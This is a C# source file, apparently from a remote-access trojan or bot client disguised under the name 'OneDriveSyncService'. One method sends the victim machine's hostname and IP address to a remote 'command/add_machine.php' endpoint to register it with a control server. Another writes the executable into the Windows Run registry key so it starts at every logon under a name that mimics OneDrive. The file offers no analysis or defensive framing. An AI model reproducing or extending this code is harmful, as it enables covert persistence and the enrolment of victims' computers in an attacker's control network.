using System;
using System.Diagnostics;
using System.Net;

namespace OneDriveSyncService
{
    internal class Join
    {
        public static string JoinServer(WebClient webClient, string serverName)
        {
            webClient.Headers.Clear();
            webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
            Uri uri = new Uri(new Uri(serverName), "command/add_machine.php");
            string payload = "name=" + Dns.GetHostName() + "&ip=" + Dns.GetHostEntry(Dns.GetHostName()).AddressList[0].ToString();
            string response = webClient.UploadString(uri, payload);
            return response;
        }

        public static void Startup()
        {
            using (var regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
            {
                regKey?.SetValue("OneDriveSyncService", Process.GetCurrentProcess().MainModule.FileName);
            }
        }
    }
}
